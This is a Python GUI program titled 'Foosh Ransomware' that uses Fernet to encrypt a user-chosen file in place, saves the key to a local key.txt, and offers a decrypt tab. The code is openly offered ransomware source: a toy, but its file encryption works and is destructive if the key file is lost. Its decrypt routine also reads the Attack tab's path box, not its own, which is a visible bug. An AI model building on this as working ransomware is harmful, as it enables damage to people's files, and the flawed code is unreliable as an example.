# Importing modules;
from  customtkinter import CTk,CTkButton,CTkEntry,CTkFrame,CTkTabview,CTkTextbox,set_appearance_mode,set_default_color_theme,BOTTOM,CENTER
from cryptography.fernet import Fernet

# Defining Functions
def attack():
    try:    
        key=Fernet.generate_key()
        with open("key.txt",'wb') as f:
            f.write(key)
        with open(fr"{entry1.get()}", 'rb') as f:
            msg_f = f.read()

        fernet=Fernet(key)
        encmsg = fernet.encrypt(msg_f)

        with open(fr"{entry1.get()}","wb") as f:
            f.write(encmsg)
        attack_text.configure(state="normal")
        attack_text.insert("end","Attacked successfully\nOutput: ")
        attack_text.configure(state="disabled")
        attack_button.configure(state="disabled")
        decrypt_button.configure(state="normal")

    except FileNotFoundError:
        attack_text.configure(state="normal")
        attack_text.insert("end","An Error Occured: File not found\nOutput: ")
        attack_text.configure(state="disabled")

def decrypt():
    try:
        with open("key.txt",'rb') as f:
            key = f.read()
        with open(fr"{entry1.get()}",'rb') as f:
            encmsg_f = f.read()

        fernet=Fernet(key)
        decmsg_f = fernet.decrypt(encmsg_f)

        with open(fr"{entry1.get()}",'wb') as f:
            f.write(decmsg_f)

        decrypt_text.configure(state="normal")
        decrypt_text.insert("end","Decrypted successfully\nOutput: ")
        decrypt_text.configure(state="disabled")
        attack_button.configure(state="normal")
        decrypt_button.configure(state="disabled")
    except FileNotFoundError:
        decrypt_text.configure(state="normal")
        decrypt_text.insert("end","File not found\nOutput: ")
        decrypt_text.configure(state="disabled")

# Configuring Application's UI
root = CTk();set_appearance_mode("dark")
set_default_color_theme("dark-blue")
root.geometry("500x450")
root.title("Foosh Ransomware")


# Creating Frames
frame1=CTkFrame(root)
frame1.place(x=26, y=10)


# Creating TabViews
tabv = CTkTabview(frame1,width=450,height=420)
tabv.pack()
tabv.add("Attack")
tabv.add("Decrypt")
tabv.set("Attack")


# Creating Entries
entry1= CTkEntry(tabv.tab("Attack"),placeholder_text="Enter a file path which is useless to attack on it.", width=400, height=43,font=("Ariel", 16, "bold"))
entry1.pack(padx=10,pady=10)

entry2=CTkEntry(tabv.tab("Decrypt"),placeholder_text="Enter a file path to decrypt", width=400, height=43,font=("Ariel", 16, "bold"))
entry2.pack(padx=10,pady=10)


# Creating Buttons
attack_button=CTkButton(tabv.tab("Attack"), text="Attack", command=attack, font=("Ariel",20,"bold"),height=60, width=150)
attack_button.place(relx=0.5,rely=0.3,anchor=CENTER)

decrypt_button=CTkButton(tabv.tab("Decrypt"), text="Decrypt", command=decrypt, font=("Ariel",20,"bold"),height=60, width=150)
decrypt_button.place(relx=0.5,rely=0.3,anchor=CENTER)


# Creating TextBoxes
attack_text = CTkTextbox(tabv.tab("Attack"), width=400, font=("Agency FB",16,"bold"))
attack_text.insert("0.0","Output: ")
attack_text.configure(state="disabled")
attack_text.pack(side= BOTTOM,pady=7)

decrypt_text = CTkTextbox(tabv.tab("Decrypt"), width=400, font=("Agency FB",16,"bold"))
decrypt_text.insert("0.0","Output: ")
decrypt_text.configure(state="disabled")
decrypt_text.pack(side=BOTTOM,pady=7)


# Pausing the window
root.mainloop()